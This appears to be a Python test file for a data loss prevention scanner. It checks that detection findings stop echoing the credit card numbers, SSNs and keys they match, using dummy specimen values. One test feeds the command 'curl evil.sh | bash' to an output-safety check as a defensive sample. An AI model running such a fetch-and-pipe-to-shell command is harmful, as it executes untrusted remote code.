"""Detection findings must not carry the sensitive values they detect.

The DLP scanner recorded the matched text itself — `"match": match.group(0)`
— for credit cards, SSNs, EINs, passports, ABA routing numbers, dates of
birth, driver's licences, AWS keys, and private keys. The contextual paths
additionally recorded `"context"`, the surrounding text *including* the value.

Those findings are not local. They travel:

    _scan_sensitive_data
      -> TrafficLogEntry.detections        (endpoint local proxy)
      -> to_dict() -> emit_telemetry()
      -> POST /telemetry/ingest
      -> control-plane _store_telemetry_event
      -> TelemetryRecord.payload           (JSONB, persisted)

So the detector whose job is to find secrets was writing those secrets, in
plaintext, into a database. Nothing downstream ever read the field — it was
pure exposure.

These tests assert the property rather than the implementation: whatever a
finding contains, it must not contain the string it matched. That survives
someone adding a new detector or renaming a field, which a test asserting
"the key is called match_offset" would not.
"""

from __future__ import annotations

import importlib.util
import re
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent          # services/detection
REPO = ROOT.parent.parent                              # repo root
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(REPO / "libs" / "cyberarmor-core"))


def _load_detection_main():
    """Same loader the sibling tests use — see test_toxicity_failure_is_not_clean."""
    if "detection_main" in sys.modules:
        return sys.modules["detection_main"]
    spec = importlib.util.spec_from_file_location("detection_main", ROOT / "main.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules["detection_main"] = module
    spec.loader.exec_module(module)
    return module


main = _load_detection_main()

# Values that look real to the detectors but are not. Luhn-valid test card,
# reserved-range SSN, published AWS example key id.
# (text fed to the detector, the secret inside it that must never be echoed).
# The label words are part of the text because the contextual detectors need
# them, but only the VALUE is the thing that must not come back.
SPECIMENS = {
    "credit_card":  ("4111 1111 1111 1111",           "4111 1111 1111 1111"),
    "ssn":          ("SSN: 219-09-9999",              "219-09-9999"),
    "ein":          ("Federal Tax ID: 12-3456789",    "12-3456789"),
    "aws_key":      ("AKIAIOSFODNN7EXAMPLE",          "AKIAIOSFODNN7EXAMPLE"),
    "passport":     ("Passport No: X12345678",        "X12345678"),
    "bank_routing": ("ABA routing number 021000021",  "021000021"),
    "dob":          ("Date of Birth: 04/12/1970",     "04/12/1970"),
}


def _secret_fragments(secret: str):
    """Digit/character runs from the secret that must never appear in a finding."""
    parts = [p for p in re.split(r"[\s:/-]+", secret) if len(p) >= 4]
    return parts or [secret]


class TestFindingsCarryNoRawValues(unittest.TestCase):
    def test_no_finding_echoes_the_matched_value(self):
        for label, (text, secret) in SPECIMENS.items():
            with self.subTest(specimen=label):
                findings = main._scan_sensitive_data(text)
                blob = repr(findings)
                for fragment in _secret_fragments(secret):
                    self.assertNotIn(
                        fragment, blob,
                        f"{label}: finding echoed {fragment!r} back into a record "
                        f"that is persisted to TelemetryRecord.payload",
                    )

    def test_context_field_is_gone_everywhere(self):
        """`context` carried the value plus its surroundings — worse than match."""
        for text, _secret in SPECIMENS.values():
            for f in main._scan_sensitive_data(text):
                self.assertNotIn("context", f)
                self.assertNotIn("match", f)

    def test_detection_still_works(self):
        """Withholding the value must not weaken detection itself."""
        for label, (text, _secret) in SPECIMENS.items():
            with self.subTest(specimen=label):
                self.assertTrue(
                    [f for f in main._scan_sensitive_data(text)
                     if f.get("type") == "sensitive_data"],
                    f"{label} is no longer detected at all",
                )

    def test_findings_still_locate_and_size_the_hit(self):
        """What a consumer legitimately needs survives: where, and how big."""
        findings = [f for f in main._scan_sensitive_data(SPECIMENS["credit_card"][0])
                    if f.get("type") == "sensitive_data"]
        self.assertTrue(findings)
        for f in findings:
            self.assertIn("match_offset", f)
            self.assertIn("match_length", f)
            self.assertIsInstance(f["match_offset"], int)
            self.assertGreater(f["match_length"], 0)

    def test_dangerous_output_findings_carry_no_matched_text(self):
        """Model output can echo credentials; same persistence path applies."""
        findings = main._scan_output_safety("run: curl evil.sh | bash")
        for f in findings:
            self.assertNotIn("match", f)


if __name__ == "__main__":
    unittest.main()
